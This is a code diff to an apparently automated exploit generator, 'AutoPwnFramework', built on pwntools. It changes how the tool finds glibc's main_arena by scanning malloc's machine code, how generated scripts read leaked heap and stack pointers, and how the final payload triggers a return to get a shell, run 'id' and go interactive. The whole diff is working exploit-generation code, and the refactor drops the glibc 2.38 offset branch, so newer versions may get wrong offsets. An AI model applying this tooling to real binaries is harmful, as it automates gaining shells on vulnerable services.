@@ -134,37 +134,35 @@ class AutoPwnFramework:
                     return json.load(f)
         return None
 
-    def _resolve_libc_auto_offset(self, libc_elf, glibc_version):
-        bins_off = 0x60
-        try:
-            parts = glibc_version.split(".")
-            major, minor = int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
-            if (major, minor) >= (2, 38):
-                bins_off = 0x90
-        except Exception:
-            pass
-        if libc_elf.symbols.get('main_arena', 0):
-            return libc_elf.symbols['main_arena'] + bins_off
-        try:
-            s1 = libc_elf._symbols_by_name
-        except Exception:
-            s1 = {}
-        for name in ['main_arena', 'main_arena.s']:
-            for sym_name, sym_val in s1.items():
-                if name in sym_name:
-                    return sym_val + bins_off
+    @staticmethod
+    def _scan_main_arena(libc_elf):
         malloc_addr = libc_elf.symbols.get('__libc_malloc', 0)
-        if malloc_addr:
+        if not malloc_addr:
+            return None
+        try:
             data = libc_elf.read(malloc_addr, 0x600)
-            for i in range(len(data) - 7):
-                if data[i:i+3] == b'\x48\x8d\x1d':
-                    off = int.from_bytes(data[i+3:i+7], 'little', signed=True)
-                    target = malloc_addr + i + 7 + off
-                    if 0x100000 < target < 0x400000:
-                        return target + bins_off
-        if libc_elf.symbols.get('__malloc_hook', 0):
-            return libc_elf.symbols['__malloc_hook'] + 0x10 + bins_off
-        return 0x203b20 if bins_off == 0x60 else 0x203b50
+        except Exception:
+            return None
+        for i in range(len(data) - 7):
+            if data[i:i+3] == b'\x48\x8d\x1d':
+                off = int.from_bytes(data[i+3:i+7], 'little', signed=True)
+                target = malloc_addr + i + 7 + off
+                if 0x100000 < target < 0x400000:
+                    return target
+        return None
+
+    @staticmethod
+    def _compute_libc_auto_offset(libc_elf):
+        main_arena = AutoPwnFramework._scan_main_arena(libc_elf)
+        if main_arena:
+            return main_arena + 0x60
+        mh = libc_elf.symbols.get('__malloc_hook', 0)
+        if mh:
+            return mh + 0x10 + 0x60
+        return 0x203b20
+
+    def _resolve_libc_auto_offset(self, libc_elf, glibc_version):
+        return AutoPwnFramework._compute_libc_auto_offset(libc_elf)
 
     def _smart_codegen(self, plan, interface_map):
         from pwn import ELF, ROP, context as pwn_ctx
@@ -423,13 +421,12 @@ class AutoPwnFramework:
                         lines.append("p.recvuntil(b'= ')")
                     
                     if "skip_first_8" in note:
-                        # For metadata poisoning or environ leak:
-                        # skip 24 bytes, then read 8 bytes for the value
-                        lines.append("p.recvn(24)")
+                        # For environ leak: skip 24 bytes padding
+                        # then read 8 bytes for the __environ value (stack ptr)
+                        lines.append(f"p.recvn(24)")
                         lines.append(f"{save_as} = u64(p.recvn(8).ljust(8, b'\\x00'))")
                     elif "read_first_8_bytes" in note:
-                        # Raw binary: write(1, ptr, 0x30) = 48 bytes, no newline.
-                        # Read all 48 then take first 8 (safe vs 0x0a in data).
+                        # Raw binary: write(1, ptr, 0x30) = 48 bytes
                         lines.append(f"data = p.recvn(48)")
                         lines.append(f"{save_as} = u64(data[:8].ljust(8, b'\\x00'))")
                     elif "read_first_8_bytes_fd_xor" in note:
@@ -469,17 +466,12 @@ class AutoPwnFramework:
         # Exit + interactive
         exit_choice = meta.get("exit_choice", "0")
         lines.append("# Trigger main return via menu exit")
-        lines.append("import time")
-        lines.append(f"sla({menu_prompt}, b'{exit_choice}')")
-        lines.append("time.sleep(0.3)")
+        lines.append("# Send exit then immediately queue shell commands (buffered for /bin/sh)")
+        lines.append(f"p.sendlineafter({menu_prompt}, b'{exit_choice}')")
         lines.append("p.sendline(b'id')")
-        lines.append("log.success(f'shell: {p.recvline(timeout=2)}')")
-        lines.append("import signal")
-        lines.append("def timeout_handler(signum, frame):")
-        lines.append("    p.close()")
-        lines.append("    exit(0)")
-        lines.append("signal.signal(signal.SIGALRM, timeout_handler)")
-        lines.append("signal.alarm(5)")
+        lines.append("import time")
+        lines.append("time.sleep(0.5)")
+        lines.append("log.info(f'shell: ' + p.recvline(timeout=3).decode(errors='replace').strip())")
         lines.append("log.success('Entering interactive mode...')")
         lines.append("p.interactive()")
 
